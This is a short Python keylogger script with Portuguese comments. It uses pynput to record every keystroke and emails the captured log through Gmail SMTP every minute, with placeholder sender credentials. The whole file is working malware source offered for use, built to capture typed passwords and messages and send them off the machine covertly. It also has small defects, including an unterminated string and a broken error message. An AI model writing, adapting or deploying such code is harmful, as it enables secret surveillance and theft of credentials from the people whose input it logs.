from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

# Configurações do email
log = ""

EMAIL_ORIGEM = "SeuEmail@gmail.com"
EMAIL_DESTINO= "SeuEmail@gmail.com
SENHA_EMAIL = "senha123"

# Enviar email
def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'dados keylogger'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO   

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.sendmail(EMAIL_ORIGEM, EMAIL_DESTINO, msg.as_string())
        except Exception as e:
            print("Erro ao enviar email: e")

        log = ""

# Agendar envio do email
    Timer(60, enviar_email).start()  # Envia a cada 1 minuto

def on_press(key):
        global log
        try:
            log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif key == keyboard.Key.backspace:
                log += "  "
            elif key == keyboard.Key.esc:
                log += " [ESC] "
            else:
                pass

# iniciar keylogger e o envio automático de emails
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
